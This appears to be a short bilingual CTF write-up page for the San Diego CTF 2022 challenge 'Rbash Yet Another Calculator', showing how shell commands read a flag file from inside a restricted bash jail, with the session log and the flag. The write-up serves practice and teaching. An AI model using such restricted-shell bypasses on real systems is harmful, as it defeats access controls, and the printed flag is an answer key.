@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Rbash Yet Another Calculator (San Diego CTF 2022) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>Rbash Yet Another Calculator</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+TCPサーバの接続情報が与えられた。
+</p><p>
+<code>echo *</code> コマンドでカレントディレクトリのファイル一覧を取得すると、 <code>flag-xEpAN7X3tGYjt4Y0p0FD.txt</code> という項目があることがわかった。<br>
+<code>echo `&lt; flag-xEpAN7X3tGYjt4Y0p0FD.txt`</code> コマンドでこのファイルの内容を出力すると、flagが得られた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+Information to connect to a TCP server was given.
+</p><p>
+Retrieving the list of files in the current directory via <code>echo *</code> command, I found that there is an entry <code>flag-xEpAN7X3tGYjt4Y0p0FD.txt</code>.<br>
+I obtained the flag by printing the contents of this file using <code>echo `&lt; flag-xEpAN7X3tGYjt4Y0p0FD.txt`</code> command.
+</p>
+</div>
+<code-block data-extension="txt">
+== proof-of-work: disabled ==
+rbash-5.0$ echo *
+flag-xEpAN7X3tGYjt4Y0p0FD.txt jail.sh
+rbash-5.0$ echo `&lt; flag-xEpAN7X3tGYjt4Y0p0FD.txt`
+sdctf{red1r3ct1ng_std1n_IS_p3rm1tt3d_1n_rb45h!}
+rbash-5.0$
+</code-block>
+
+<div class="flag">sdctf{red1r3ct1ng_std1n_IS_p3rm1tt3d_1n_rb45h!}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">San Diego CTF 2022</a>
+</p>
+</body>
+</html>
